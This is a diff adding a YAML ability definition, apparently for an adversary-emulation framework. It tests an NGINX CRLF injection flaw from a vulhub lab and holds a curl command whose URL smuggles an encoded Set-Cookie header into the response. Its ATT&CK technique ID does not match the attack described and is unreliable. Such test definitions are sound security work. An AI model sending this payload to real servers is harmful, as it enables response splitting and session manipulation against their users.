@@ -1,0 +1,35 @@
+- tactic: execution
+  technique_name: NGINX CRLF Injection Vulnerability
+  technique_id: T1001.002
+  name: NGINX CRLF Injection Vulnerability
+  description: https://github.com/vulhub/vulhub/blob/master/nginx/insecure-configuration/README.md
+  executors:
+  - name: sh
+    platform: linux
+    command: curl -i http://localhost:#{host.port.8080}/%0d%0aSet-Cookie:%20a=1;
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 5
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements:
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: host.port.8080
+      edge: ''
+      target: ''
+  privilege: ''
+  repeatable: false
+  buckets:
+  - execution
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: crlf-injection
